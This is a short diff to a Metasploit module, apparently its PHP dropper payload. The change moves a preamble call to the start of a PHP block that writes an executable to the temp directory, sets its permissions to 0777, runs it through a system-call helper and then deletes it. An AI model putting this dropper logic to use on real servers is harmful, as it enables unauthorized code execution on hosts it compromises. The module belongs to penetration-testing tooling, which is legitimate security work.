@@ -40,6 +40,7 @@ module MetasploitModule
     exename = Rex::Text.rand_text_alpha(rand(8) + 4)
     dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
     shell = <<-END_OF_PHP_CODE
+    #{php_preamble({:disabled_varname => dis})}
     if (!function_exists('sys_get_temp_dir')) {
       function sys_get_temp_dir() {
         if (!empty($_ENV['TMP'])) { return realpath($_ENV['TMP']); }
@@ -63,7 +64,6 @@ module MetasploitModule
     fclose($fd_out);
     chmod($fname, 0777);
     $c = $fname;
-    #{php_preamble({:disabled_varname => dis})}
     #{php_system_block({:cmd_varname => "$c", :disabled_varname => dis})}
     @unlink($fname);
     END_OF_PHP_CODE
